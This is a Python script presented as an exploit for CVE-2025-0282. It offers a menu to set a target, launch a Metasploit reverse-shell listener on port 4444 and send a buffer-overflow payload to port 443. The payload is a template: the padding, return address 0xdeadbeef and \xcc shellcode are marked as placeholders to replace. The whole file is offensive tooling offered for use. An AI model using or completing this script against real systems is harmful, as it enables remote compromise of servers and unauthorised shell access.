import sys
import socket
import struct
import subprocess
import time

# Function to print a simple menu for the user
def print_menu():
    print("\n--- CVE-2025-0282 Exploit Options ---")
    print("1. Enter Target IP or URL")
    print("2. Start Metasploit Listener (multi/handler)")
    print("3. Send Reverse Shell Exploit Payload")
    print("4. Exit")

# Function to handle Metasploit listener
def start_metasploit_listener():
    print("\nStarting Metasploit listener...")
    try:
        subprocess.run(["msfconsole", "-q", "-x", "use multi/handler; set payload linux/x86/shell_reverse_tcp; set lhost 0.0.0.0; set lport 4444; exploit"], check=True)
        print("[+] Metasploit listener started successfully.")
    except Exception as e:
        print(f"[-] Error starting Metasploit: {e}")

# Function to send exploit payload
def send_reverse_shell_exploit(target_ip):
    payload = b"A" * 500  # Placeholder for overflow (adjust with the correct offset)
    payload += struct.pack("<I", 0xdeadbeef)  # Example address (adjust to target's address)
    payload += b"\x90" * 100  # NOP sled
    payload += b"\xcc" * 20  # Example shellcode (replace with actual)

    print(f"\nSending reverse shell exploit to {target_ip}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, 443))
        sock.send(payload)
        print(f"[+] Payload sent to {target_ip} on port 443.")
        sock.close()
    except Exception as e:
        print(f"[-] Error sending exploit: {e}")

# Function to prompt for IP or URL input
def get_target_ip():
    target_ip = input("\nEnter the target IP or URL: ")
    return target_ip

# Main function with menu logic
def main():
    while True:
        print_menu()
        choice = input("\nSelect an option (1-4): ")

        if choice == "1":
            target_ip = get_target_ip()
            print(f"[+] Target IP/URL set to: {target_ip}")
        
        elif choice == "2":
            start_metasploit_listener()
        
        elif choice == "3":
            if 'target_ip' not in locals():
                print("[-] Please set the target IP or URL first by selecting option 1.")
                continue
            send_reverse_shell_exploit(target_ip)
        
        elif choice == "4":
            print("[+] Exiting program.")
            sys.exit(0)
        
        else:
            print("[-] Invalid option, please try again.")

if __name__ == "__main__":
    main()
